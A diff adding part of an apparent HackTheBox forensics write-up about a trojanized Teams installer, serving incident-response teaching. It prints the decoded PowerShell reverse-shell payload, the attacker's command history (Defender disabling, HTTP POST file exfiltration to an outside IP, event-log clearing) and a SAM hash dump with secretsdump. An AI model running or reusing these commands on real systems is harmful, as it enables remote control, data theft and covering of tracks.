@@ -5,7 +5,6 @@ date: 2026-01-21
 tags: ['HackTheBox']
 image: './banner.png'
 authors: ['enscribe']
-password: 'HackTheBox-26.01.21'
 ---
 
 import Callout from '@/components/Callout.astro'
@@ -200,3 +199,132 @@ powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Eli\Ap
 ```
 
 ### Task 11: Identify the attacker's IP address and port.
+
+To find the **attacker's IP address and Port**, we will use the following command to dump the **resident files** from `$MFT`:
+
+```shell
+MFTECmd.exe -f "D:\sharedVB\mnt\SillyEli\Acquisition\C\$MFT" --csv "D:\mftout" --csvf mft.csv --dr
+```
+
+<Callout title="What is resident files?" variant="note">
+  These files have their data (`$DATA`) stored as residents (located directly
+  within the `$MFT` record), rather than in off-disk clusters (non-resident).
+</Callout>
+
+In the folder containing the dumped resident files, we found a rather suspicious `ps1` file:
+
+```shell
+$ strings 315567-1-1_Teams.ps1.bin
+
+(NEW-obJECT SYSTem.Io.StreAmReADEr( ( NEW-obJECT  iO.ComPrEsSiOn.DEFlateStReam( [iO.memoRysTREAm][sYsTEM.coNvERT]::FROMbasE64stRiNg( 'TY9Ra8JAEITfC/0Py3EtdzQeiVHbGiy0oYhQtDRCHyTQJC56rYnibVBR/3svaVr6sMdyzHwzy00+EGPctSbpJ2YE0cEQ5mqMpKJ19oVk1DR8DVcaCxLMu28rr3enPP/WTps5nY4vpRoiRbTFJBcymKUHwlkc85RgAK5SvW7X756uju452C31CoXgesBNrt4wmQsrc1zHvuoFiwUtpYRWgeDKY8DnFvC/2xT3pB6jcDR6LrL1XBeL32i7NiTgWgaXFzw9bBJjLIDVBma/1iVtyqqU0LgHS28/XHtwgklJrR+GhBtgHwUDqza1ckZVJjZxcb/fgOvgJ3upEQ1XVp5cvW81obBuB6oy5u+u8zc=') ,[iO.CoMPreSSiOn.CompressioNmODe]::deCoMPRess) ), [systEm.text.EnCOdIng]::ascII) ).ReaDTOend() | Iex
+```
+
+We can decode this payload as follows:
+
+```py
+
+import base64, zlib
+
+b64 = "TY9Ra8JAEITfC/0Py3EtdzQeiVHbGiy0oYhQtDRCHyTQJC56rYnibVBR/3svaVr6sMdyzHwzy00+EGPctSbpJ2YE0cEQ5mqMpKJ19oVk1DR8DVcaCxLMu28rr3enPP/WTps5nY4vpRoiRbTFJBcymKUHwlkc85RgAK5SvW7X756uju452C31CoXgesBNrt4wmQsrc1zHvuoFiwUtpYRWgeDKY8DnFvC/2xT3pB6jcDR6LrL1XBeL32i7NiTgWgaXFzw9bBJjLIDVBma/1iVtyqqU0LgHS28/XHtwgklJrR+GhBtgHwUDqza1ckZVJjZxcb/fgOvgJ3upEQ1XVp5cvW81obBuB6oy5u+u8zc="
+data = base64.b64decode(b64)
+text = zlib.decompress(data, wbits=-15).decode("ascii", errors="replace")
+print(text)
+```
+
+```powershell
+$sm=(New-Object System.Net.Sockets.TCPClient("192.168.137.132",443)).GetStream();[byte[]]$bt = 0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d = (New-Object Text.ASCIIEncoding).GetString($bt,0, $i);
+$bypass = "ASCII"
+$output = (iex $d 2>&1 | Out-String) + "`n"
+$st = ([text.encoding]::$bypass).GetBytes($output)
+$sm.Write($st, 0, $st.Length)}
+```
+
+**How it works:**
+
+- The victim's machine connects to `192.168.137.132:443`.
+- Remote sends a command string and the victim (IEX) executes it.
+- The victim sends back output (including errors) over the same TCP channel.
+
+### Task 12: What is the name of the sensitive file exfiltrated by the threat actor?
+
+We can view the **PowerShell commands** that the attacker executed at the following path:
+
+```shell
+C/Users/Eli/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/
+```
+
+```powershell
+whoami
+hostname
+net user
+net user Eli
+findstr /s /i /m "mimikatz" "C:\Users\Eli\Documents\*"
+Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring
+Set-MpPreference -DisableRealtimeMonitoring $true
+Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring
+findstr /s /i /m "password" .docx.doc .pdf.pptx
+findstr /s /i /m "sensitive" .docx.doc .pdf.pptx
+Get-ChildItem -Path C:\ -Include *.pdf, *.doc, *.docx -Recurse -ErrorAction SilentlyContinue
+cd C:\Users\Eli\Documents
+ls
+type "Meeting Notes.txt"
+Invoke-WebRequest -Uri "http://91.240.118.162:8080/" -Method Post -InFile "C:\Users\Eli\Documents\Employees_Contact_Info.pdf" -ContentType "application/octet-stream";
+Invoke-WebRequest -Uri "http://91.240.118.162:8080/" -Method Post -InFile "C:\Users\Eli\Documents\IT_Collaboration_Platform.pptx" -ContentType "application/octet-stream";
+Remove-Item -Path "C:\Users\Eli\Documents\Employees_Contact_Info.pdf" -Force
+Remove-Item -Path "C:\Users\Eli\Documents\IT_Collaboration_Platform.pptx" -Force
+ls
+Get-EventLog -LogName * | ForEach-Object { Clear-EventLog -LogName $_.Log }
+```
+
+We can see that the attacker executed a series of commands with the aim of **discovery**, **inspecting**, and **disabling** Windows Defender, and **stealing** two files via HTTP POST to upload them directly to an external server.
+
+### Task 13: At what time did the attacker clear the Windows event logs? (in UTC)
+
+For this task, you just need to check **Event ID 1102** in the **Security Log**:
+
+> 2024-11-06 02:16:50 UTC
+
+### Task 14: What is the name of the legitimate tool used by the threat actor to acquire the SAM and SYSTEM hives?
+
+In **task 7**, we saw it download a zip file named `kape.zip`. And in the `$MFT` file, we can easily see that `kape.exe` has been executed. Therefore, it is very likely that the tool being exploited here is `kape`.
+
+### Task 15: Identify the password belonging to Eli’s account that were exfiltrated by the attacker to their C2 server.
+
+You can simply dump the password by using two registry entries: **SAM** and **SYSTEM**.
+
+```shell
+$ impacket-secretsdump -sam ../SAM -system ../SYSTEM -security ../SECURITY LOCAL
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Target system bootKey: 0x035c7eeba16ca4cc5d5a91190b13a35b
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d9a2192b83449ffb92ddd5ad93144b43:::
+Eli:1001:aad3b435b51404eeaad3b435b51404ee:4494236c3843cdc39ce068871bed96e0:::
+Metushelah:1002:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+```
+
+Then use the **hashcat** or [crackstation](https://crackstation.net/), and you will have Eli's password: `crackstation`.
+
+## Conclusion
+
+This forensic investigation revealed a sophisticated supply chain attack targeting Eli's workstation through a trojanized Teams installer. The attacker's methodology demonstrated several key techniques:
+
+**Attack Chain Summary:**
+The threat actor initially compromised Eli's system by delivering a malicious `TeamsSetup.exe` file disguised as legitimate software. This initial payload established persistence through a scheduled task (`TeamsUpdater`) and downloaded additional tools including Mimikatz for credential theft and KAPE for evidence collection.
+
+**Key Findings:**
+
+- **Timeline Accuracy**: The forensic artifacts (prefetch files, registry hives, event logs) provided precise timestamps of the attack progression
+- **Persistence Mechanism**: The scheduled task `{A4F7ED3E-E7CD-4539-8E79-D73B568FC298}` ensured continued access through a hidden PowerShell script
+- **Data Exfiltration**: Two sensitive files (`Employees_Contact_Info.pdf` and `IT_Collaboration_Platform.pptx`) were successfully exfiltrated to `91.240.118.162:8080`
+- **Credential Compromise**: The attacker dumped both SAM and SYSTEM registry hives, leading to the compromise of Eli's password
+
+**Lessons Learned:**
+This case underscores the importance of defense-in-depth strategies: implementing code signing verification, using application whitelisting, enabling real-time threat detection, and maintaining robust logging. The attacker's ability to disable Windows Defender highlights the necessity of additional endpoint protection layers and the value of immutable audit logs stored off-system.
+
+Through methodical forensic analysis, we successfully reconstructed the complete attack narrative and identified all indicators of compromise, demonstrating why DFIR expertise is crucial in modern cybersecurity operations.
+
+<div class="mx-auto">![Old TOC implementation](assets/suc.png)</div>
